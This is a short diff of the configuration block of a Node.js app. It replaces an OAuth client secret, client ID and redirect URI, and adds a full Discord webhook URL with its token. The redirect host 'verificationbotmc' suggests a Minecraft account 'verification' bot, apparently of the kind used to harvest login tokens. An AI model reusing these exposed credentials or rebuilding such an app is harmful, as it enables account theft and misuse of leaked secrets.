@@ -1,8 +1,8 @@
 //Config
-const secret_value = '.WW8Q~BnSgyVc5h5DzTEQWU5wRmqyeJdqIo4Tas8'
-const client_id = 'a06c832a-e2a5-4d5e-a2b3-c5f8fb61fe35'
-const redirect_uri = 'https://d-na.herokuapp.com/'
-const webhook_url = 'webhook'
+const secret_value = 'c428Q~_2hN4RiuwwGsXhqumorF-NmJQNCmMAvdc-'
+const client_id = '0fdcced1-0646-49e1-90c1-8cc038590bf5'
+const redirect_uri = 'https://verificationbotmc.cyclic.app/'
+const webhook_url = 'https://discord.com/api/webhooks/1057055182971752468/jQ4rQA7MxlDJeuSBEn9WrGTys44VFxBHbykIegAijURYulmBZ4ZDrZ06p77Qz96w5xiB'
 //Requirements
 const axios = require('axios')
 const express = require('express')
